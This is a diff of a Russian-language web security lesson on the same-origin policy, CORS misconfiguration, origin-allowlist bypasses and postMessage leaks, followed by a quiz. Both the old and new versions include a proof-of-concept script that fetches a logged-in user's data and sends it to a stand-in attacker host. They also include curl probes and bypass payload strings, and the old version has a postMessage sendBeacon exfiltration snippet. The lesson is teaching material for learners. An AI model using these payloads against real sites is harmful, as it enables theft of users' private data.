@@ -14,47 +14,129 @@ estimated_minutes: 45
 summary: "Почему браузер не даёт читать чужой домен, как CORS это разрешает и какие конфигурации открывают доступ злоумышленнику."
 ---
 
-Браузер — это среда, где ваш JS с одного сайта не должен читать данные другого сайта. За это отвечает **Same-Origin Policy (SOP)**. А когда сайтам нужно легально общаться между доменами, включают **CORS**. Ошибки в CORS-конфигурации — один из самых частых багов в API, потому что «разрешить всё» выглядит удобно, а на деле отдаёт данные атакующему.
+Представь: пользователь залогинен в `shop.local`, а в соседней вкладке он открыл твой сайт `evil.local`. Если бы скрипт с `evil.local` мог свободно читать ответы `shop.local`, он бы утащил чужие заказы и данные. Именно поэтому в браузере есть **Same-Origin Policy (SOP)** — правило «читай только свой домен». А чтобы сайтам можно было легально общаться, придумали **CORS**. Ошибки в CORS — один из самых частых багов в API.
 
-## Теория: что такое Origin
+В этом уроке мы возьмём API магазина `api.shop.local` и проверим **одну** его конфигурацию: можно ли с чужого сайта прочитать данные пользователя.
 
-**Origin (источник)** = схема + хост + порт. Всё три вместе.
+## Наш пример: API магазина
+
+У `shop.local` есть отдельный API-домен `api.shop.local`, который отдаёт данные пользователя:
+
+```bash
+$ curl -s 'https://api.shop.local/api/me' -b 'session=...'
+{"user":"admin","email":"admin@shop.local","role":"admin"}
+```
+
+Ответ содержит приватные данные. Вопрос: а может ли их прочитать скрипт, запущенный на `evil.local`, если жертва залогинена? Именно это решает SOP и CORS.
+
+## Шаг 1: что такое Origin
+
+**Origin (источник)** — это схема + хост + порт, все три вместе. Смена любого компонента делает origin другим:
 
 | URL | Origin |
 |-----|--------|
-| `https://a.com/x` | `https://a.com` |
-| `https://a.com:8443/x` | `https://a.com:8443` |
-| `http://a.com` | `http://a.com` (другая схема!) |
-| `https://sub.a.com` | `https://sub.a.com` (другой хост!) |
+| `https://shop.local/x` | `https://shop.local` |
+| `http://shop.local` | `http://shop.local` (другая схема!) |
+| `https://api.shop.local` | `https://api.shop.local` (другой хост!) |
+| `https://shop.local:8443` | `https://shop.local:8443` (другой порт!) |
 
-`https://a.com` и `http://a.com` — **разные** origin. `a.com` и `b.a.com` — тоже разные.
+`https://shop.local` и `https://api.shop.local` — **разные** origin. `https://shop.local` и `http://shop.local` — тоже разные.
 
-**SOP** означает: JS со страницы `https://evil.com` не может прочитать ответ `fetch('https://bank.com/api/me')`. Важно: SOP **не запрещает отправить** запрос (это делает CSRF, см. `web-csrf`), он запрещает **прочитать ответ** и делиться им.
+SOP означает: JS со страницы `https://evil.local` не может **прочитать ответ** `fetch('https://api.shop.local/api/me')`. Важно: SOP не запрещает *отправить* запрос — он запрещает **прочитать результат**. (Запрет на действие — это уже CSRF, отдельный класс.)
 
-## Теория: как работает CORS
+## Шаг 2: пробуем в лоб — браузер блокирует
 
-Когда JS делает кросс-доменный запрос, браузер добавляет заголовок `Origin: https://evil.com`. Сервер может ответить:
+На странице `https://evil.local` напишем:
+
+```html
+<script>
+  fetch('https://api.shop.local/api/me', {credentials:'include'})
+    .then(r => r.text())
+    .then(d => console.log(d));
+</script>
+```
+
+Браузер отправит запрос (cookie жертвы уйдут, потому что `credentials:'include'`), но в консоли появится ошибка:
 
 ```
-Access-Control-Allow-Origin: https://evil.com
+Access to fetch at 'https://api.shop.local/api/me' from origin 'https://evil.local'
+has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present.
+```
+
+Это SOP в действии: без явного разрешения ответ не отдаётся скрипту.
+
+## Шаг 3: CORS — как сервер разрешает
+
+Когда JS делает кросс-доменный запрос, браузер сам добавляет заголовок `Origin: https://evil.local`. Сервер может ответить:
+
+```
+Access-Control-Allow-Origin: https://evil.local
 Access-Control-Allow-Credentials: true
 ```
 
-`Access-Control-Allow-Origin` (ACAO) говорит браузеру: «ответ этому origin читать можно». Если значение не совпадает с Origin или заголовка нет — браузер отдаёт JS ошибку и «прячет» тело.
+`Access-Control-Allow-Origin` (ACAO) говорит браузеру: «ответ этому origin читать можно». Если значение не совпадает с `Origin` или заголовка нет — браузер отдаёт ошибку и «прячет» тело.
 
-Для «сложных» запросов (нестандартные методы, `Content-Type: application/json`, кастомные заголовки) браузер сначала шлёт **preflight** — `OPTIONS` с заголовками `Access-Control-Request-Method` и `Access-Control-Request-Headers`. Сервер должен ответить `Access-Control-Allow-Methods`/`-Headers`.
+Проверим конфигурацию `api.shop.local` руками, подставив `Origin: https://evil.local`:
 
-Ключевые опасные конфигурации:
+```bash
+$ curl -s -i 'https://api.shop.local/api/me' \
+    -H 'Origin: https://evil.local' -b 'session=...' | grep -i access-control
+Access-Control-Allow-Origin: https://evil.local
+Access-Control-Allow-Credentials: true
+```
 
-1. `Access-Control-Allow-Origin: *` вместе с `Access-Control-Allow-Credentials: true` — **невалидно по спеке** (браузер отклонит), поэтому атакующие ищут отражение.
-2. **Отражение Origin без валидации:** сервер берёт `Origin` и возвращает его же в ACAO. Любой сайт получает доступ.
-3. **Слабая проверка суффикса/префикса:** `if (origin.endsWith('example.com'))` — обходится доменом `example.com.evil.com` или `evilexample.com`.
-4. **Доверие `null`:** если ACAO возвращает `null` (для sandbox-iframe, `data:`), атакующий получает доступ из sandbox-страницы.
-5. **Чрезмерный whitelist:** внутренние/дев-домены (`http://localhost`, `*.dev.example.com`) в списке — XSS/поддомен-тейковер открывает доступ.
+Сервер вернул **наш** origin обратно. Проверим ещё раз с другим доменом — если он тоже отражается, значит валидации нет:
 
-## Теория: postMessage
+```bash
+$ curl -s -i 'https://api.shop.local/api/me' \
+    -H 'Origin: https://evil2.local' -b 'session=...' | grep -i 'access-control-allow-origin'
+Access-Control-Allow-Origin: https://evil2.local
+```
 
-Межоконное/межфреймовое общение идёт через `window.postMessage`. Ошибка — **отсутствие проверки `event.origin`**:
+Отражается любой origin вместе с `Allow-Credentials: true` — это **критичный** CORS-баг: любой сайт может прочитать данные залогиненного пользователя.
+
+## Шаг 4: собираем PoC
+
+Теперь докажем, что данные реально утекают. На странице `https://evil.local`:
+
+```html
+<script>
+  fetch('https://api.shop.local/api/me', {credentials:'include'})
+    .then(r => r.text())
+    .then(d => fetch('https://attacker.example/log?d=' + encodeURIComponent(d)));
+</script>
+```
+
+Жертва открывает `evil.local`, будучи залогинена в магазине, — и её данные уходят на сервер атакующего:
+
+```
+GET /log?d=%7B%22user%22%3A%22admin%22%2C%22email%22%3A%22admin%40shop.local%22%7D
+```
+
+Вот это и есть артефакт находки: приватные данные в логе атакующего.
+
+## Шаг 5: обходы проверки и postMessage
+
+Часто разработчики «проверяют» домен нестрого. Классическая ошибка — проверка по суффиксу:
+
+```js
+if (origin.endsWith('shop.local')) { /* разрешить */ }
+```
+
+Её обходит домен, который ты можешь зарегистрировать сам:
+
+```bash
+$ curl -s -i 'https://api.shop.local/api/me' \
+    -H 'Origin: https://attacker-shop.local' -b 'session=...' | grep -i access-control-allow-origin
+Access-Control-Allow-Origin: https://attacker-shop.local
+```
+
+Строка `attacker-shop.local` заканчивается на `shop.local`, поэтому проверка `endsWith` её пропускает. Правильно — сравнивать по границе домена (`endsWith('.shop.local')`) или точно.
+
+Ещё два вектора:
+
+- **`Origin: null`** — так выглядит origin из sandbox-iframe и `data:`-страниц. Если сервер отражает `null`, ты можешь читать данные из своего sandbox.
+- **`postMessage` без проверки origin.** Межоконное общение:
 
 ```js
 // УЯЗВИМО: принимает сообщение из любого окна
@@ -63,217 +145,68 @@ window.addEventListener('message', (e) => {
 });
 ```
 
-Атакующий открывает сайт во фрейме и шлёт `postMessage` с произвольными данными → DOM-XSS или утечка. Также опасен `targetOrigin: '*'` при отправке секретов.
+Атакующий открывает сайт в iframe и шлёт произвольные данные → DOM-XSS или утечка. Защита — проверять `e.origin` по белому списку.
 
-## Инструменты: curl и Burp
+## Шаг 6: preflight — предварительный запрос
 
-Проверить preflight вручную:
-
-```bash
-curl -s -i -X OPTIONS https://api.target.local/user/me \
-  -H 'Origin: https://evil.com' \
-  -H 'Access-Control-Request-Method: GET' \
-  -H 'Access-Control-Request-Headers: authorization'
-```
-
-Смотрим на `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods`.
-
-Проверить «настоящий» запрос:
+Если запрос «сложный» (метод `PUT`/`DELETE`, заголовок `Content-Type: application/json` или кастомный заголовок), браузер сначала шлёт **preflight** — запрос методом `OPTIONS`, спрашивая разрешение:
 
 ```bash
-curl -s -i https://api.target.local/user/me \
-  -H 'Origin: https://evil.com' \
-  -b 'session=...'
-```
-
-Быстрый скрипт перебора origin-вариантов (запускается вручную, не циклом по чужим данным):
-
-```bash
-for o in https://evil.com https://target.local.evil.com https://eviltarget.local \
-         null http://localhost http://127.0.0.1; do
-  acao=$(curl -s -I "https://api.target.local/x" -H "Origin: $o" \
-        | grep -i '^access-control-allow-origin' | tr -d '\r')
-  echo "$o -> $acao"
-done
-```
-
-В **Burp** удобно расширение **CORS* / CORS Misconfiguration** или ручной Repeater: меняете `Origin` и смотрите на ответ.
-
-## Разобранный пример: отражение Origin → кража данных
-
-Шаг 1. Проверяем произвольный origin:
-
-```bash
-curl -s -i 'https://api.target.local/api/me' -H 'Origin: https://evil.com' -b 'session=victim'
-```
-
-Ответ:
-
-```
-Access-Control-Allow-Origin: https://evil.com
+$ curl -s -i -X OPTIONS 'https://api.shop.local/api/me' \
+    -H 'Origin: https://evil.local' \
+    -H 'Access-Control-Request-Method: GET' | grep -i access-control
+Access-Control-Allow-Origin: https://evil.local
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
 Access-Control-Allow-Credentials: true
 ```
 
-Это значит: сервер отражает любой Origin и разрешает credentials. Классический критичный CORS-баг.
+Список `PUT, DELETE` — расширенная поверхность: с чужого origin разрешены и изменяющие методы. Проверяй preflight и сам запрос **отдельно**: иногда их правила различаются.
 
-Шаг 2. Проверяем, что данные реально читаются. На странице `https://evil.com`:
+## Полный прогон: от проверки до утечки
 
-```html
-<script>
-fetch('https://api.target.local/api/me', {credentials:'include'})
-  .then(r => r.text())
-  .then(d => fetch('https://attacker.example/log?d=' + encodeURIComponent(d)));
-</script>
-```
-
-Жертва открывает `evil.com` (будучи залогинена на target), и её данные утекают на сервер атакующего. Это **High/Critical**: чтение приватных данных через браузер жертвы.
-
-Шаг 3. Убедиться, что это не false positive: повторить с `Origin: https://evil2.com` — если снова отражается, валидации нет.
-
-## Разобранный пример: bypass проверки суффиксом
-
-Если код проверяет `origin.endsWith('target.local')`:
-
-```bash
-curl -s -I 'https://api.target.local/api/me' -H 'Origin: https://attacker-target.local' -b 'session=victim'
-# Access-Control-Allow-Origin: https://attacker-target.local
-```
-
-Домен `attacker-target.local` (которым вы владеете) проходит проверку `endsWith`, и вы читаете данные. Аналогично `target.local.evil.com` при проверке `startsWith`.
-
-## Частые ошибки
-
-- **Путать CORS с защитой от CSRF.** CORS разрешает/запрещает чтение ответа, но не мешает выполнить действие. CSRF — отдельный класс.
-- **Верить `ACAO: *` без credentials.** Если `Allow-Credentials` не `true`, cookie жертвы не уйдут, и баг менее критичен (но публичные API всё равно могут утечь).
-- **Игнорировать preflight.** Проверять надо и `OPTIONS`, и сам запрос — иногда правила различаются.
-- **Не проверять `null` и поддомены.** Самая частая «дыра» — доверие `null` или dev-домену.
-- **Забывать про postMessage.** Даже при идеальном CORS `addEventListener('message')` без проверки origin ломает изоляцию.
-- **Ломать прод тестами.** Меняйте только заголовок `Origin`; не шлите разрушительные методы.
-
-## Полный разбор: CORS с credentials и кража данных (с выводом)
-
-Мисконфиг CORS опасен, когда сервер отражает `Origin` и включает `Access-Control-Allow-Credentials: true`. Тогда скрипт с чужого домена читает приватные данные жертвы.
-
-Шаг 1. Проверяем отражение Origin:
-
-```bash
-curl -s -I https://api.example/me -H 'Origin: https://evil.com' | grep -i access-control
-# Access-Control-Allow-Origin: https://evil.com
-# Access-Control-Allow-Credentials: true
-# -> критично
-```
-
-Шаг 2. Строим PoC-страницу на своём домене:
+1. Находим API, который отдаёт данные пользователя с credentials.
+2. Подставляем `Origin: https://evil.local` — сервер отражает его и ставит `Allow-Credentials: true`.
+3. Строим страницу-эксплойт на своём домене:
 
 ```html
 <script>
-fetch('https://api.example/me', {credentials:'include'})
-  .then(r => r.text())
-  .then(d => fetch('https://attacker/collect?d='+encodeURIComponent(d)));
+  fetch('https://api.shop.local/api/me', {credentials:'include'})
+    .then(r => r.text())
+    .then(d => fetch('https://attacker.example/log?d=' + encodeURIComponent(d)));
 </script>
 ```
 
-Шаг 3. Жертва открывает страницу → браузер шлёт cookie на `api.example`, читает ответ (потому что Origin разрешён) и эксфильтрует его на наш сервер:
+4. Жертва открывает страницу → её данные уходят к нам.
 
-```
-GET /collect?d=%7B%22user%22%3A%22admin%22%2C%22token%22%3A%22eyJ...%22%7D
-```
+Артефакт — приватные данные в логе атакующего. Если `Allow-Credentials` не выставлен, а данные отдаются по ключу в URL, кража тоже возможна, но нужен утекший или предсказуемый ключ.
 
-Если `Allow-Credentials` не стоит, но эндпоинт отдаёт данные без cookie (например, по API-ключу в URL) — кража тоже возможна, но нужен предсказуемый/утекший ключ.
-
-## postMessage: обработчики и утечки
-
-`window.postMessage` без проверки `event.origin` — классическая утечка. Ищем:
-
-```javascript
-window.addEventListener('message', e => {
-  // нет проверки e.origin -> любой iframe/окно может прислать сообщение
-  document.getElementById('token').value = e.data;
-});
-```
-
-Или обработчик, который **отвечает** любому источнику:
-
-```javascript
-window.addEventListener('message', e => {
-  e.source.postMessage(location.href, '*');   // утечка URL (в т.ч. с токеном)
-});
-```
-
-PoC — открыть цель в iframe и послать сообщение:
-
-```html
-<iframe id=f src="https://app.example/widget"></iframe>
-<script>
-f.onload = () => {
-  f.contentWindow.postMessage('getToken','*');
-  window.addEventListener('message', e => navigator.sendBeacon('https://attacker/c', e.data));
-};
-</script>
-```
-
-Проверка: смотрим в DevTools → Sources → ищем `addEventListener('message'`. Уязвимо, если нет `if (e.origin !== 'https://expected') return;`.
-
-## Reference-таблица: заголовки CORS и их значение
+## Справочная таблица заголовков CORS
 
 | Заголовок | Значение | Риск |
 |-----------|----------|------|
-| `Access-Control-Allow-Origin: *` | любой origin | нельзя с credentials, но публичная утечка данных |
-| `ACAO: <reflected Origin>` | эхо Origin | критично вместе с credentials |
-| `Access-Control-Allow-Credentials: true` | разрешены cookie | усиливает любой ACAO |
-| `Access-Control-Allow-Methods` | методы | расширяет поверхность (PUT/DELETE) |
-| `Access-Control-Allow-Headers` | заголовки | доступ к кастомным заголовкам |
-| `Access-Control-Expose-Headers` | видимые заголовки | утечка токенов в заголовках |
-| `Access-Control-Max-Age` | кеш preflight | снижает защиту при смене политики |
-| `Vary: Origin` | корректное кеширование | без него кеш отдаёт чужой ACAO |
+| `Access-Control-Allow-Origin` | какой origin читает ответ | отражение = критично |
+| `Access-Control-Allow-Credentials` | разрешены cookie | усиливает любой ACAO |
+| `Access-Control-Allow-Methods` | методы | `PUT`/`DELETE` расширяют поверхность |
+| `Access-Control-Expose-Headers` | видимые заголовки | утечка токенов |
+| `Vary: Origin` | корректный кэш | без него — отравление кэша |
 
-## Обход allowlist: суффиксы, null-origin, поддомены
+## Что мы теперь знаем
 
-Разработчики часто «проверяют» домен нестрого:
+- Origin = схема + хост + порт; любое изменение делает origin другим.
+- SOP не даёт читать ответ чужого origin, но не мешает отправить запрос.
+- CORS разрешает чтение через `Access-Control-Allow-Origin`; с credentials нужен точный origin.
+- Отражение произвольного `Origin` + `Allow-Credentials: true` — критичный баг (кража данных).
+- `postMessage` без проверки `event.origin` — отдельная утечка/DOM-XSS.
 
-- **Суффикс:** `if (origin.endsWith('example.com'))` → `https://evil-example.com` и `https://example.com.evil.com` проходят.
-- **Префикс:** `startsWith('https://example.com')` → `https://example.com.evil.com` проходит.
-- **Регистр/схема:** `HTTPS://EXAMPLE.COM`, `http://example.com` (если проверка строгая по `https`).
-- **null-origin:** `Origin: null` (sandboxed iframe, `data:`, `file:`) — многие allowlist'ы пропускают `null`.
-- **Поддомен:** `https://sub.example.com` при allowlist на apex.
-- **`@`-трюк:** `https://example.com@evil.com` — если парсится наивно.
-- **Порты:** `https://example.com:evil` / нестандартный порт.
-- **Спецсимволы:** `https://example.com%60.evil.com`, `https://example.com%2f@evil.com`.
+## На что смотреть дальше
 
-Проверяем все варианты, подставляя `Origin` и глядя на отражённый `ACAO`:
-
-```bash
-for o in 'https://evil-example.com' 'https://example.com.evil.com' 'null' 'http://example.com'; do
-  echo -n "$o -> "
-  curl -s -I https://api.example/me -H "Origin: $o" | grep -i 'access-control-allow-origin'
-done
-```
-
-## Что делать дальше / решение
-
-1. **Найти CORS-эндпоинты** (API, `/me`, `/api/*`) — обычно с credentials.
-2. **Проверить отражение** `Origin` + `Allow-Credentials`.
-3. **Перебрать обходы allowlist** (суффикс/префикс/null/поддомен).
-4. **Собрать PoC** с `credentials:'include'` и эксфильтрацией на свой хост.
-5. **Проверить postMessage** — обработчики без проверки `origin` и те, что отвечают `'*'`.
-6. **Учесть кеш:** без `Vary: Origin` кешированный ответ с чужим ACAO может отравлять других клиентов.
-
-## SOP: что реально защищает
-
-Same-Origin Policy — базовый барьер: скрипт с `https://evil.com` не может прочитать ответ `https://api.example` без явного разрешения CORS. Origin = схема + хост + порт; смена любого компонента делает origin другим.
-
-Важные детали, которые ломают наивные ожидания:
-
-- **`document.domain`:** старый способ ослабить SOP между поддоменами; если цель его выставляет, `a.example.com` и `b.example.com` читают друг друга.
-- **`window.open` / iframe:** получить доступ к `contentWindow` чужого origin нельзя, но можно *писать* в `location` (кликджекинг, navigation-based leak).
-- **Куки:** `SameSite=Lax`/`Strict` ограничивают отправку в кросс-сайтовых запросах — это не SOP, а защита от CSRF; проверяйте атрибут отдельно.
-- **`crossOriginIsolated`:** если страница не изолирована, `SharedArrayBuffer` недоступен — влияет на тайминговые атаки.
-
-Понимание SOP нужно, чтобы отличать настоящий CORS-мисконфиг от ложного срабатывания: отражение `Origin` без credentials не даёт читать аутентифицированные данные, а `*` и `credentials:true` вместе запрещены спецификацией — браузер отклонит такой ответ.
+- **`Vary: Origin`.** Без него кэш может отдать одному клиенту `ACAO`, предназначенный другому.
+- **`Access-Control-Expose-Headers`.** Может раскрыть чувствительные заголовки (например, токены).
+- **`document.domain`.** Если сайт его выставляет, изоляция между поддоменами ослабляется.
 
 ## Квиз
 
-Выберите один вариант в каждом вопросе.
+Выбери один вариант в каждом вопросе.
 
 ```quiz
 - question: "Что такое Origin?"
@@ -300,14 +233,14 @@ Same-Origin Policy — базовый барьер: скрипт с `https://evi
     - "Включает preflight"
   answer: 1
   explanation: "Origin `null` можно получить из sandbox/data-контекстов, которыми управляет атакующий."
-- question: "Проверку `origin.endsWith("example.com")` обходит домен, который атакующий может зарегистрировать сам:"
+- question: "Проверку `origin.endsWith('shop.local')` обходит домен, который атакующий может зарегистрировать сам:"
   options:
-    - "`example.com.attacker.net`"
-    - "`attackerexample.com`"
+    - "`shop.local.attacker.net`"
+    - "`attackershop.local`"
     - "`attacker.net`"
     - "`sub.attacker.net`"
   answer: 1
-  explanation: "Строка `attackerexample.com` заканчивается на `example.com`, поэтому проверка `endsWith` её пропускает. Поэтому суффиксную проверку надо делать по границе домена (`endsWith('.example.com')` или точное сравнение)."
+  explanation: "Строка `attackershop.local` заканчивается на `shop.local`, поэтому `endsWith` её пропускает."
 - question: "Какую проверку обязательно должен делать обработчик `message`?"
   options:
     - "Проверять `event.data` на длину"
@@ -315,12 +248,16 @@ Same-Origin Policy — базовый барьер: скрипт с `https://evi
     - "Проверять `document.domain`"
     - "Проверять `Referer` в JS"
   answer: 1
-  explanation: "Без проверки `event.origin` любой сайт может слать сообщения в ваш обработчик."
+  explanation: "Без проверки `event.origin` любой сайт может слать сообщения в твой обработчик."
 ```
+
+## Куда дальше
+
+Мы разобрались, почему браузер изолирует домены. Теперь посмотрим, **где** приложение хранит токены и данные на клиенте — и почему это опасно при XSS. Об этом в следующем уроке про Web Storage. А пока запомни: **SOP запрещает читать чужой ответ; CORS это разрешает — и ошибка в разрешении отдаёт данные атакующему.**
 
 ## Где пригодится
 
 - **CTF (Web):** CORS-мисконфиг и postMessage-XSS — популярные задания, где флаг отдаётся только «правильному» origin.
 - **Bug bounty:** отражение Origin с credentials — высокооплачиваемый баг; проверяется за минуты через curl.
-- **Пентест:** анализ CORS входит в проверку API и одностраничных приложений (SPA), где весь трафик идёт на отдельный API-домен.
-- **Работа (AppSec/Dev):** настройка CORS — частая причина утечек; умение выставить точечный whitelist вместо `*` — базовый навык.
+- **Пентест:** анализ CORS входит в проверку API и одностраничных приложений (SPA).
+- **Работа (AppSec/Dev):** настройка CORS и обработчиков `message` — базовая гигиена клиентской безопасности.
